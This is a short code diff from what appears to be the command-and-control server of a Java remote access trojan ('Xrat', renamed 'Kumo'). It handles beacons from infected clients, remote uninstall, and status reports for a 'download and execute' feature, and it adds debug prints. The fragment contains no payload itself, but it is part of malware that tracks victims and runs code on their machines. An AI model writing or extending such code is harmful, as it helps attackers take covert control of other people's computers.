@@ -89,7 +89,7 @@ class ProcessCommands implements Repository {
             }
             /* Uninstall and close remote server - remove from Xrat */
             else if (input.contains("EXIT")) {
-                PseudoBase.getXratData().remove(client.getIP());
+                PseudoBase.getKumoData().remove(client.getIP());
                 CONNECTIONS.remove(client.getIP());
                 Controller.updateStats();
                 Controller.updateTable();
@@ -98,7 +98,9 @@ class ProcessCommands implements Repository {
             } else if (input.contains("BEACON")) {
                 client.setOnlineStatus("Online");
             } else if (input.contains("DAE")){
-                int status = dis.readInt();
+                System.out.println("OH YEA DAE IS FUN");
+                int status = Integer.parseInt(dis.readUTF());
+                System.out.println("DOWNLOAD AND EXECUTE STATUS: " + status);
                 if (status == 0){
                     DownloadAndExecuteView.setStatusLabelColor("red");
                     DownloadAndExecuteView.setStatusLabel("Failed to execute");
